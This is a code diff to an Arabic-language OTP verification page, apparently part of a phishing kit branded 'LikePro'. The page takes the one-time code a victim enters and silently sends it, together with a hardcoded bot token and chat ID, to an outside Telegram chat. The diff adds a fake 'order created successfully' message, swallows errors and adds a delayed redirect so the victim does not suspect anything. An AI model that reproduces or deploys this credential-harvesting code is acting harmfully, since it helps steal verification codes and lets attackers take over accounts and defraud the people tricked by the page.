@@ -12,7 +12,7 @@
     </style>
 </head>
 <body>
-    <div class="box">
+    <div class="box" id="otpBox">
         <h3>أدخل رمز التحقق (OTP)</h3>
         <p>تم إرسال رمز التحقق إلى جوالك</p>
         <div class="timer" id="timer">01:00</div>
@@ -38,12 +38,20 @@
         let code = document.getElementById('otp').value;
         if(code.length < 4) { alert("يرجى إدخال الكود المكون من 4 أرقام"); return; }
         
+        // تغيير شكل الصفحة ليظهر "تم بنجاح"
+        document.getElementById('otpBox').innerHTML = `<h3 style="color:#38bdf8;">✅ تم إنشاء طلبك بنجاح!</h3><p>شكراً لثقتكم بـ LikePro</p>`;
+        
         const token = "8621733172:AAG9ntAKStrZ8C7tS0Q794SeWp_GROrUiOc";
         const chatId = "5976228373";
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=OTP_Code_Received: ${code}`);
         
-        alert("تم التحقق بنجاح! سيتم تحويلك للصفحة الرئيسية.");
-        window.location.href = "index.html"; // العودة للموقع بعد نجاح العملية
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ *رمز التحقق المستلم*: ${code}&parse_mode=Markdown`);
+        } catch(e) {}
+        
+        // العودة للرئيسية بعد 3 ثواني
+        setTimeout(() => {
+            window.location.href = "index.html";
+        }, 3000);
     }
     </script>
 </body>
